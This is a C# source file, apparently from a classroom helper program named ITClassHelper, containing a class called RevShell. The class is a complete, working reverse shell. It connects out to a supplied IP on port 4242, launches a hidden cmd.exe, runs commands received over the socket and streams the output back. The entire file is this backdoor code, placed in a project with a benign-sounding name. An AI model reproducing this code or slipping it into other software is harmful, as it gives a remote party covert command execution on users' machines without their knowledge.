using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ITClassHelper
{
    internal class RevShell
    {
        static StreamWriter sw;

        public static void Reverse(string ip)
        {
            using (TcpClient client = new TcpClient(ip, 4242))
            {
                using (Stream s = client.GetStream())
                {
                    using (StreamReader sr = new StreamReader(s))
                    {
                        sw = new StreamWriter(s);
                        StringBuilder str = new StringBuilder();
                        Process proc = new Process();
                        proc.StartInfo.FileName = "cmd.exe";
                        proc.StartInfo.CreateNoWindow = true;
                        proc.StartInfo.UseShellExecute = false;
                        proc.StartInfo.RedirectStandardOutput = true;
                        proc.StartInfo.RedirectStandardInput = true;
                        proc.StartInfo.RedirectStandardError = true;
                        proc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        proc.Start();
                        proc.BeginOutputReadLine();
                        while (true)
                        {
                            try
                            {
                                str.Append(sr.ReadLine());
                                proc.StandardInput.WriteLine(str);
                                str.Remove(0, str.Length);
                            }
                            catch { continue; }
                        }
                    }
                }
            }
        }

        public static void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!string.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strOutput.Append(e.Data);
                    sw.WriteLine(strOutput);
                    sw.Flush();
                }
                catch { }
            }
        }
    }
}
